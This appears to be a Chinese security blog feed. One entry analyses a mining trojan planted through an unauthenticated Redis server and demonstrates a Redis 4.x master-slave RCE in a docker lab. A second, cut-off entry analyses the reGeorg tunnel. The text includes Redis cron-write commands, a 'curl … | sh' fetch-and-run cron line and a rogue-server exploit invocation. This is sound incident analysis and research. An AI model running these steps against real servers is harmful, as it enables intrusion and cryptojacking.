    <url>/2019/07/29/%E5%AF%B9%E4%B8%80%E6%AC%A1%20redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%20redis%204.x%20RCE%20%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>前段时间自己使用 redis 开发的时候，搞了一个 docker ，然后直接开放连接没有密码，其实一开始我就知道会被黑产扫到然后给我种马，但是把因为也是测试服务，其实也没怎么上心，于是就放任自由了，结果第二天果然收到了一份新鲜的木马。然后简单对其入侵做了一个分析，结果发现没有能攻击成功，但是既然木马在了就简单看看吧。</p><h2 id="0X01-简单回顾一下-redis-攻击的过程"><a href="#0X01-简单回顾一下-redis-攻击的过程" class="headerlink" title="0X01 简单回顾一下 redis 攻击的过程"></a><strong>0X01 简单回顾一下 redis 攻击的过程</strong></h2><h3 id="1-攻击条件"><a href="#1-攻击条件" class="headerlink" title="1.攻击条件"></a><strong>1.攻击条件</strong></h3><h4 id="1-空密码并且允许外部直接连接"><a href="#1-空密码并且允许外部直接连接" class="headerlink" title="(1)空密码并且允许外部直接连接"></a><strong>(1)空密码并且允许外部直接连接</strong></h4><p><strong>注：这一点其实有很多细节</strong></p><p>因为在 3.2 以后有了保护模式，保护模式的作用就是在没有设置密码<strong>并且</strong>没有配置 bind 地址的时候强行只允许本机连接，但是对于绑定地址或者是配置过密码的服务来讲这一项可以忽略。</p><p>另外还有一个误区就是这个绑定地址不是绑定外部的地址，而是绑定自己服务器的允许作为与外部进行连接的 IP 地址，比如绑定自己服务器的外网 IP，或者绑定 127.0.0.1 或者绑定 0.0.0.0 ，这个绑定 0.0.0.0 就是绑定了自己服务器全部的 ip 地址(服务器可以有很多的 ip ，比如内网 ip 、回环 ip、外网 IP 等 )，因此其实对于一般的服务器来说，绑定自己的外网 ip 和直接绑定 0.0.0.0 是没区别的，不设置密码的情况下去绑定外网 ip 起不到任何的保护作用，返回会因为绑定了地址让保护模式失效遭受攻击。</p><span id="more"></span><p><strong>说一句题外话就是：想要安全的话设置了空密码就要绑定内网地址，否则就老老实实设置密码</strong></p><h4 id="2-使用-root-权限启动-redis"><a href="#2-使用-root-权限启动-redis" class="headerlink" title="(2)使用 root 权限启动 redis"></a><strong>(2)使用 root 权限启动 redis</strong></h4><p>高权限用户启动的程序拥有和启动该程序用户一样的权限，这大大有利于攻击者在控制了 redis 之后借助这种高权限去修改高权限配置文件来完成攻击(不过现在高版本的 redis 启动默认都是 redis 权限了而不是原来的 root 权限)</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%9022.png" alt="此处输入图片的描述"></p><h4 id="3-redis-在没有保护措施的情况下也没有修改默认端口"><a href="#3-redis-在没有保护措施的情况下也没有修改默认端口" class="headerlink" title="(3)redis 在没有保护措施的情况下也没有修改默认端口"></a><strong>(3)redis 在没有保护措施的情况下也没有修改默认端口</strong></h4><p>默认端口是 6379 ，很容易被扫到</p><h4 id="4-补充"><a href="#4-补充" class="headerlink" title="(4)补充"></a><strong>(4)补充</strong></h4><p>Ubuntu 下执行 crontab 使用的是 sh , 而 sh 软连接的是dash ，而不是 bash，那么如果你直接在 cron 里面写 bash - i xx 的反弹是不可能成功的，解决方法有两种，一种就是使用 Python 调用 &#x2F;bin&#x2F;sh 反弹 shell ,还有一种可以尝试写 sh 文件，然后用 cron 去执行</p><h3 id="2-攻击利用的机制"><a href="#2-攻击利用的机制" class="headerlink" title="2.攻击利用的机制"></a><strong>2.攻击利用的机制</strong></h3><p>redis 的攻击主要是利用 redis 的持久化存储 RDB 或者 AOF(默认不开启)，所谓持久化就是一种快照机制，用来后期恢复数据。比如 RDB 可以在一定的条件下将当前内存的数存储进一个 dump.rdb 文件中，如果下次想恢复这个数据的话，就需要将这个文件放在 redis 的快照保存目录下，替换当前的 dump.rdb 再次重启这样就能恢复原始的数据了</p><p><strong>触发 RDB 的机制有以下几种</strong></p><p>1 在指定的时间间隔内，执行指定次数的写操作           ———–&gt;可以通过配置文件进行设置<br>2 执行save（阻塞， 只管保存快照，其他的等待） 或者是bgsave （异步）命令  —-》手动保存<br>3 执行flushall 命令，清空数据库所有数据              —-&gt;清除全部 Key 同时也会清除当前rdb<br>4 执行shutdown 命令，保证服务器正常关闭且不丢失任何数据  ———-&gt;很好地保存数据不被清除</p><h3 id="3-大概的攻击流程"><a href="#3-大概的攻击流程" class="headerlink" title="3.大概的攻击流程"></a><strong>3.大概的攻击流程</strong></h3><p><strong>(1)修改 redis 的 rdb 文件的存放路径为 root 用户的 crontab 配置文件</strong></p><p>设置 dir 到定时任务目录</p><pre><code class="hljs">config set dir &quot;/var/spool/cron&quot;</code></pre><p>设置持 rdb 文件名为root</p><pre><code class="hljs">config set dbfilename root</code></pre><p><strong>(2)使用 FLUSHALL 进行清除数据库</strong></p><pre><code class="hljs">127.0.0.1:6379&gt; flushall  OK</code></pre><p>这一步主要是想清除原始 root 文件的内容，也是为了避免不必要的格式错误</p><p><strong>(3)在 redis 中写入我们的 cron 语句</strong></p><pre><code class="hljs">127.0.0.1:6379&gt; set test &quot;\n*/10 * * * *  curl -fsSL https://xxx.xxx.xxx.xxx/xxx/xx | sh\n&quot;OK这里的换行符是为了实现写入时的格式良好，因为 cron 读取的时候是一行一行读取的，遇到格式不正确则丢弃</code></pre><p><strong>(4)强行触发 rdb 更新</strong> </p><pre><code class="hljs">127.0.0.1:6379&gt; save</code></pre><p>至此我们的 cron 的数据就写入到了 root 用户的 cron 文件夹中了</p><p><strong>(5)总结：</strong></p><p>除了可以写 cron 以外，写一个 一句话 webshell 也是可以的，其实可以清楚地看到，redis 的成功攻击除了依赖于 权限配置的失误以外，一句话 webshell 以及 cron 对格式要求的不严格也是一大重要因素。</p><h2 id="0X02-再次回到这次的木马分析"><a href="#0X02-再次回到这次的木马分析" class="headerlink" title="0X02 再次回到这次的木马分析"></a><strong>0X02 再次回到这次的木马分析</strong></h2><p>攻击者也是一样，直接 flushall 了我的全部的 key，然后直接给我写一个名为 back 的 cron ，每一分钟从他的服务器上下载了一个脚本运行。</p><pre><code class="hljs">* * * * * curl -fsSL https://xxx.xxx.xxx.xxx/xxx/xx | sh</code></pre><p>-f：不输出错误<br>-s: 静默不输出<br>-S: -s 条件下输出错误<br>-L: 跟踪重定向</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%9011.png" alt="此处输入图片的描述"></p><p>在确定了攻击者攻击并没有成功以后，我下载了木马，然后简单的分析了一下，看看有没有什么操作我没有检测到的。</p><h3 id="1-看一下-main-函数整体的调用"><a href="#1-看一下-main-函数整体的调用" class="headerlink" title="1.看一下 main 函数整体的调用"></a><strong>1.看一下 main 函数整体的调用</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%901.png" alt="此处输入图片的描述"></p><p>可以说是非常的简洁明了了，木马开始运行以后依次调用了  </p><pre><code class="hljs">mark() background()sethosts()checkhost()checkzigw()initfiles()checkcrontab()checkssh()kill()checkservice()clean()</code></pre><p>从函数名字大概就能知道木马做了些什么，应该对 crontab ssh hosts 文件都做了修改，我们来一个一个看一看。</p><h3 id="2-mark"><a href="#2-mark" class="headerlink" title="2.mark()"></a><strong>2.mark()</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%902.png" alt="此处输入图片的描述"></p><p>简单的创建了一条命令，并通过 sys 函数进行执行，这个命令的作用是创建一个空文件，从 mark() 这个函数名字可以猜测来这个空文件的作用可能是做为一个该木马有没有成功运行起来的标记</p><h3 id="3-background"><a href="#3-background" class="headerlink" title="3.background()"></a><strong>3.background()</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%903.png" alt="此处输入图片的描述"></p><p>设置进程后台运行，并改变工作目录为根目录</p><h3 id="4-checkhost"><a href="#4-checkhost" class="headerlink" title="4.checkhost()"></a><strong>4.checkhost()</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%904.png" alt="此处输入图片的描述"></p><p>删除主机原始的 hosts 文件然后，重新创建空的 hosts 文件，并添加一系列的域名指向 127.0.0.1</p><p>而这些域名经过访问都是一些矿池</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%905.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%906.png" alt="此处输入图片的描述"></p><h3 id="5-checkzigw"><a href="#5-checkzigw" class="headerlink" title="5.checkzigw()"></a><strong>5.checkzigw()</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%907.png" alt="此处输入图片的描述"></p><p>检测系统中是否存在 &#x2F;etc&#x2F;zigw、&#x2F;tmp&#x2F;zigw、&#x2F;etc&#x2F;zjgw，这些文件，如果有的话，就结束对应的进程并且删除对应的文件</p><p><strong>其中:</strong> chattr -ia 这条命令是关闭可能让文件无法删除的属性，具体可以看<a href="https://www.linuxdaxue.com/linux-command-intro-chattr.html">这里</a></p><h3 id="6-initfiles"><a href="#6-initfiles" class="headerlink" title="6.initfiles()"></a><strong>6.initfiles()</strong></h3><p>该函数的作用主要是下载挖矿木马，并且修改 rm ，首先是会检测当前的权限，如果是 root 就把木马下载到 &#x2F;etc 目录下，如果不是 root 的话就下载到 &#x2F;tmp 目录下</p><p>root 权限</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%908.png" alt="此处输入图片的描述"></p><p>非 root 权限</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%909.png" alt="此处输入图片的描述"></p><p>除了下载 pdvs 以外，还下载了 httpdz 和 migrations 这两个文件，除此之外如果是在 root 权限下就还有一个替换系统 rm 命令的操作</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%9010.png" alt="此处输入图片的描述"></p><p>rm 文件只有一个函数，既然替换了这个文件，那么一定是非常关键的东西，我们来分析一下</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%9012.png" alt="此处输入图片的描述"></p><p>这脚本的地址是什么呢？看一下 curlurl  变量的交叉引用</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%9013.png" alt="此处输入图片的描述"></p><p>其实下载下来就是我们最上面分析的那个 sh 文件，也就是说这里的替换实际上是一个双重保险</p><h3 id="7-checkcrontab"><a href="#7-checkcrontab" class="headerlink" title="7.checkcrontab()"></a><strong>7.checkcrontab()</strong></h3><p>该函数主要是对 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root 这个文件的内容进行检查，看看是不是有自己写的内容，如果没有则调用命令重新写入</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%9014.png" alt="此处输入图片的描述"></p><p>另外这里面还使用了 chattr 这个命令对文件的额外属性进行添加和删除，防止文件内容被轻易修改，例如：</p><p>chattr +i 防止系统中某个关键文件被修改<br>chadttr +a 让某个文件只能往里面追加数据，但不能删除</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%9015.png" alt="此处输入图片的描述"></p><h3 id="8-checkssh"><a href="#8-checkssh" class="headerlink" title="8.checkssh()"></a><strong>8.checkssh()</strong></h3><p>root 权限下可执行这个函数，检查 &#x2F;root&#x2F;.ssh&#x2F;authorized_keys 是否存在，不存在则重新创建</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%9016.png" alt="此处输入图片的描述"></p><h3 id="9-kill"><a href="#9-kill" class="headerlink" title="9.kill()"></a><strong>9.kill()</strong></h3><p>清理自己创建的一些进程和文件</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%9017.png" alt="此处输入图片的描述"></p><h3 id="10-checkservice"><a href="#10-checkservice" class="headerlink" title="10.checkservice()"></a><strong>10.checkservice()</strong></h3><p>检测自己创建的系统服务存在，如果存在则设置开机自启，如果不存在则重新创建这个服务，服务的作用就是下载这个木马</p><p>下图为检测服务里面的内容是不是自定义的</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%9018.png" alt="此处输入图片的描述"></p><p>如果是的话就添加到系统服务并开启</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%9019.png" alt="此处输入图片的描述"></p><p>如果检测到内容已经被修改了，那么就删除这个服务，并重新创建</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%9020.png" alt="此处输入图片的描述"></p><h3 id="11-clean"><a href="#11-clean" class="headerlink" title="11.clean()"></a><strong>11.clean()</strong></h3><p>该函数的主要作用是删除一些留下的痕迹，包括 history 和登录痕迹等</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%9021.png" alt="此处输入图片的描述"></p><h2 id="0X03-利用-Redis-主从复制来-RCE"><a href="#0X03-利用-Redis-主从复制来-RCE" class="headerlink" title="0X03 利用 Redis 主从复制来 RCE"></a><strong>0X03 利用 Redis 主从复制来 RCE</strong></h2><h3 id="1-基本原理"><a href="#1-基本原理" class="headerlink" title="1.基本原理"></a><strong>1.基本原理</strong></h3><p>该攻击方法使用的是 Redis 中的主从复制，以及 Redis4.x 中新引入的自定义模块加载功能。</p><h4 id="1-先简单解释一下这两个概念"><a href="#1-先简单解释一下这两个概念" class="headerlink" title="(1)先简单解释一下这两个概念"></a><strong>(1)先简单解释一下这两个概念</strong></h4><p><strong>主从复制的概念：</strong></p><p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。虽然 Redi s 的读写速度都非常快，但如果当把数据都存储在单个Redis的实例中，供客户端去读取的话， 那么很有可能会产生服务器难以承受的读压力。</p><p>为了缓解这样的压力，主从复制这样的机制出现了，主从模式就是指使用<strong>一个</strong>redis实例作为主机(master)，其他实例<strong>都</strong>作为从机(slave)，主机只负责写入数据，很多的从机负责读，这就很想我们常常说的 CDN 负载均衡的功能，如下图所示</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%9030.png" alt="此处输入图片的描述"></p><p><strong>那么主从复制是如何进行的呢？</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%9024.png" alt="此处输入图片的描述"></p><p>我们重点关注 RDB 文件部分，我们可以发现主从复制依赖的还是我们之前经常利用的 RDB 文件，slave 与 master 的同步就和 mysql 使用 Binlog 去恢复数据是一样的。</p><p><strong>Redis 4.x 自定义模块加载：</strong></p><p>Redis从4.0版本开始加入了对外部扩展模块的支持(其实以前在unstable的版本时 redis 就支持社区的自定义模块了)。外部扩展模块可以实现新的Redis命令，新的Redis数据结构，总之基本上可以做到所有Redis内核可以做的事情。</p><p>Redis模块需要引入redismodule.h，用C、C++或其他提供C binding的开发语言实现，并编译成动态库.so文件。</p><p><strong>模块的加载方式</strong>，一种是在配置文件redis.conf中使用loadmodule &#x2F;path&#x2F;to&#x2F;mymodule.so在Redis启动时加载。另一种方式在运行时使用命令MODULE LOAD &#x2F;path&#x2F;to&#x2F;mymodule.so加载。加载的模块可以使用命令MODULE LIST查看，使用MODULE UNLOAD mymodule卸载。</p><p>加载了模块以后我们就能直接执行我们在模块中自定义的命令了，这是不是有点像 MYSQL 的 UDF(其实就是一个道理)</p><h4 id="2-将两者配合起来"><a href="#2-将两者配合起来" class="headerlink" title="(2)将两者配合起来"></a><strong>(2)将两者配合起来</strong></h4><p>slave 能主从复制机制从 master 获取到 rdb 文件，那么我们是不是可以自己写一个 “流氓服务器” 去模拟 master 然后将我们自定义的模块通过这种主从复制机制传递到 slave 上，slave 端只要将，我们传递来的 rdb 文件保存成一个 .so 文件然后再去进行模块加载，我们的攻击就完成了</p><h3 id="2-该种利用方法的优点"><a href="#2-该种利用方法的优点" class="headerlink" title="2.该种利用方法的优点"></a><strong>2.该种利用方法的优点</strong></h3><p>使用这种攻击方法就可以完美的解决下面两个问题，直接实现在目标机器上 RCE </p><p>1.高版本 redis 启动默认是以 redis 权限启动的，这也就意味着，我们没法写 crontab(写文件形式修改 crontab 被禁用，只能通过交互 crontab -e 进行修改，但是对我们没有用)，可以写 redis 用户的 ssh key，但是由于是低权限用户，危害较小，当然我们可以写 webshell(前提是这台服务器上有装 web 服务)</p><p>2.ubuntu 服务器实际上用 bash 反弹比较费劲，只能考虑使用 python</p><h3 id="3-利用条件"><a href="#3-利用条件" class="headerlink" title="3.利用条件"></a><strong>3.利用条件</strong></h3><p>Redis 4.x<br>可以远程连接到目标 redis 服务器</p><h3 id="4-利用的基本步骤"><a href="#4-利用的基本步骤" class="headerlink" title="4.利用的基本步骤"></a><strong>4.利用的基本步骤</strong></h3><p>其实上面我们已经说了，这里再细化一下</p><p>(1)在目标上执行, 将自己vps设置为master: SLAVEOF vps port<br>(2)在目标上执行，设置一下 dbfilename 为 xxx.so 文件<br>(3)通过同步，将模块文件写到目标的磁盘上: FULLRESYNC &lt;Z*40&gt; 1\r\n$<len>\r\n<pld><br>(4)在目标上执行，加载模块: MODULE LOAD &#x2F;tmp&#x2F;exp.so</p><h3 id="5-利用演示"><a href="#5-利用演示" class="headerlink" title="5.利用演示"></a><strong>5.利用演示</strong></h3><p><strong>(1)下载 redis 4.0 镜像作为受害靶机</strong></p><pre><code class="hljs">docker pull redis:4.0</code></pre><p><strong>(2)交互方式运行镜像，将 6379 端口映射到主机的 6666 端口</strong></p><pre><code class="hljs">docker run -p 6666:6379 -it 67f7ad418fdf /bin/bash</code></pre><p><strong>(3)在 docker 中启动 redis 服务</strong></p><pre><code class="hljs">redis-server</code></pre><p><strong>(4)启动以后我们可以远程连接看一下效果</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%9026.png" alt="此处输入图片的描述"></p><p>可以看到远端成功无权限访问我的 redis 数据库，并且可以插入数据</p><p><strong>(5)在主机中 clone 攻击脚本(从土师傅的 git 上 fork 下来添加了个 .so)</strong></p><pre><code class="hljs">git clone https://github.com/K0rz3n/redis-rogue-server-1.git</code></pre><p><strong>(6)运行脚本</strong></p><pre><code class="hljs">python3 redis-rogue-server.py --rhost 127.0.0.1 --rport 6666 --lhost xxx.xxx.xxx.xxx --lport 2333</code></pre><p>运行脚本后靶机就会把我们的 lhost 作为 master 然后自己做为 slave 了，并且会同步数据</p><p>靶机运行效果：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%9027.png" alt="此处输入图片的描述"></p><p>流氓服务器运行效果：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%9028.png" alt="此处输入图片的描述"></p><blockquote><p>注：这里的 127 实际上是靶机，xxx 代表的是我的 “流氓服务器”</p></blockquote><p><strong>(7)查看现在的 redis 服务器</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%9025.png" alt="此处输入图片的描述"></p><p>可以看出来，现在的数据库以及沦为了只读模式的 slave </p><p><strong>(8)执行命令</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%85%A5%E4%BE%B5%E5%88%86%E6%9E%9029.png" alt="此处输入图片的描述"></p><h2 id="0X04-参考链接"><a href="#0X04-参考链接" class="headerlink" title="0X04 参考链接"></a><strong>0X04 参考链接</strong></h2><p><a href="https://xz.aliyun.com/t/1800">https://xz.aliyun.com/t/1800</a><br><a href="http://www.antirez.com/news/106">http://www.antirez.com/news/106</a><br><a href="https://blog.csdn.net/Stubborn_Cow/article/details/50442950">https://blog.csdn.net/Stubborn_Cow/article/details/50442950</a><br><a href="http://redisdoc.com/replication/slaveof.html">http://redisdoc.com/replication/slaveof.html</a><br><a href="https://liangshuang.name/2017/08/19/redis-module/">https://liangshuang.name/2017/08/19/redis-module/</a><br><a href="https://lorexxar.cn/2019/07/10/redis-5-x-rce/">https://lorexxar.cn/2019/07/10/redis-5-x-rce/</a><br><a href="https://www.cnblogs.com/iamstudy/articles/redis_load_module_rce.html#4298164">https://www.cnblogs.com/iamstudy/articles/redis_load_module_rce.html#4298164</a><br><a href="https://www.cnblogs.com/lshs/p/6195257.html">https://www.cnblogs.com/lshs/p/6195257.html</a><br><a href="https://www.cnblogs.com/ivictor/p/9749491.html">https://www.cnblogs.com/ivictor/p/9749491.html</a><br><a href="https://www.cnblogs.com/kismetv/p/9236731.html">https://www.cnblogs.com/kismetv/p/9236731.html</a><br><a href="https://blog.csdn.net/sk199048/article/details/50725369">https://blog.csdn.net/sk199048/article/details/50725369</a><br><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>reGeorg 工作流程分析(以 php 为例)</title>
    <link href="/2019/07/27/reGeorg%20%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90(%E4%BB%A5%20php%20%E4%B8%BA%E4%BE%8B)/"/>
    <url>/2019/07/27/reGeorg%20%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90(%E4%BB%A5%20php%20%E4%B8%BA%E4%BE%8B)/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>渗透中难免会遇到内网，有内网就会有代理，那么大概率就会用到 reGeorg 这个 socks 代理工具，那么在我们拿到的服务器不能有出网的流量的时候是不是也可以用这个工具呢？想到这个问题的时候其实我也不是很清楚，毕竟这个工具的实现我也不是很了解。那么如此厉害的工具究竟是怎么实现的，使用条件有没有必须要连接外网这一条呢？本文就是对这个工具源码的简单分析。</p><h2 id="0X01-整体流程图"><a href="#0X01-整体流程图" class="headerlink" title="0X01 整体流程图"></a><strong>0X01 整体流程图</strong></h2><p>我这里以 PHP tunnel 为例，画了一个工具的流程图，我们先睹为快</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/reGeorg%20%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B1.jpg" alt="此处输入图片的描述"></p><span id="more"></span><blockquote><p>**PS:**实际上这张图是一个特殊情况，因为 PHP dl() 函数被默认禁用，于是没法加载 socket 动态库，于是这里使用的是 fsocketopen 获取内网服务器的资源,另外数据也可能不会存储在文件中，直接保存变量然后 send 到服务器就好了，或者是直接从服务器 receive 到变量，然后直接返回</p></blockquote><h2 id="0X02-代码分析"><a href="#0X02-代码分析" class="headerlink" title="0X02 代码分析"></a><strong>0X02 代码分析</strong></h2><h3 id="1-reGeorgSocksProxy-py"><a href="#1-reGeorgSocksProxy-py" class="headerlink" title="1.reGeorgSocksProxy.py"></a><strong>1.reGeorgSocksProxy.py</strong></h3><p>这个运行起来就是本地的一个 socks 服务器，主要作用就是接受浏览器的 socks 请求，与远端代理服务器建立 session 连接，将数据从浏览器传递给远端代理服务器，或者是将代理服务器传回来的数据使用 socks 再传回到浏览器显示。</p><h4 id="1-检查远端代理服务器的连通性"><a href="#1-检查远端代理服务器的连通性" class="headerlink" title="(1)检查远端代理服务器的连通性"></a><strong>(1)检查远端代理服务器的连通性</strong></h4><p>会通过 requests 请求代理服务器,看看返回值是不是预定义的那句话，如果是的话就代表访问成功，远端代理服务器正常运行</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/reGeorg%20%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B2.jpg" alt="此处输入图片的描述"></p><h4 id="2-接收浏览器的连接并与远端代理服务器建立-session"><a href="#2-接收浏览器的连接并与远端代理服务器建立-session" class="headerlink" title="(2)接收浏览器的连接并与远端代理服务器建立 session"></a><strong>(2)接收浏览器的连接并与远端代理服务器建立 session</strong></h4><p>入口函数</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/reGeorg%20%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B3.jpg" alt="此处输入图片的描述"></p><p>进行 socks 协商</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/reGeorg%20%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B4.jpg" alt="此处输入图片的描述"></p><p>与远端代理服务器建立 session 连接</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/reGeorg%20%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B5.jpg" alt="此处输入图片的描述"></p><h4 id="3-read-部分"><a href="#3-read-部分" class="headerlink" title="(3)read 部分"></a><strong>(3)read 部分</strong></h4><p>从远端代理服务器获取数据并通过 socks 发送到浏览器</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/reGeorg%20%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B6.jpg" alt="此处输入图片的描述"></p><h4 id="4-write-部分"><a href="#4-write-部分" class="headerlink" title="(4)write 部分"></a><strong>(4)write 部分</strong></h4><p>从 socks 中读取浏览器发送过来的数据，然后通过 POST 请求体发送给远端的代理服务器</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/reGeorg%20%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B7.jpg" alt="此处输入图片的描述"></p><h3 id="2-tunnel-nosocket-php"><a href="#2-tunnel-nosocket-php" class="headerlink" title="2.tunnel.nosocket.php"></a><strong>2.tunnel.nosocket.php</strong></h3><h4 id="1-创建与内网服务器的-socket"><a href="#1-创建与内网服务器的-socket" class="headerlink" title="(1)创建与内网服务器的 socket"></a><strong>(1)创建与内网服务器的 socket</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/reGeorg%20%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B8.jpg" alt="此处输入图片的描述"></p><h4 id="2-从内网服务器读取数据"><a href="#2-从内网服务器读取数据" class="headerlink" title="(2)从内网服务器读取数据"></a><strong>(2)从内网服务器读取数据</strong></h4><p>使用 fgets 读取数据然后，写入 $_SESSION[‘readbuf’] 中(ps:那个 readbuff 是笔误嘛,hhh)</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/reGeorg%20%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B9.jpg" alt="此处输入图片的描述"></p><h4 id="3-将读到的数据返回到-webpage"><a href="#3-将读到的数据返回到-webpage" class="headerlink" title="(3)将读到的数据返回到 webpage"></a><strong>(3)将读到的数据返回到 webpage</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/reGeorg%20%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B10.jpg" alt="此处输入图片的描述"></p><h4 id="4-从本地socks服务器接收数据"><a href="#4-从本地socks服务器接收数据" class="headerlink" title="(4)从本地socks服务器接收数据"></a><strong>(4)从本地socks服务器接收数据</strong></h4><p>通过 php:&#x2F;&#x2F;input 接收 post 数据然后存入 $_SESSION[‘writebuf’] 中</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/reGeorg%20%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B11.jpg" alt="此处输入图片的描述"></p><h4 id="5-从-session-中获取数据"><a href="#5-从-session-中获取数据" class="headerlink" title="(5)从 session 中获取数据"></a><strong>(5)从 session 中获取数据</strong></h4><p>通过 fwrite 写入到内网服务器</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/reGeorg%20%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B12.jpg" alt="此处输入图片的描述"></p><h2 id="0X03-总结"><a href="#0X03-总结" class="headerlink" title="0X03 总结"></a><strong>0X03 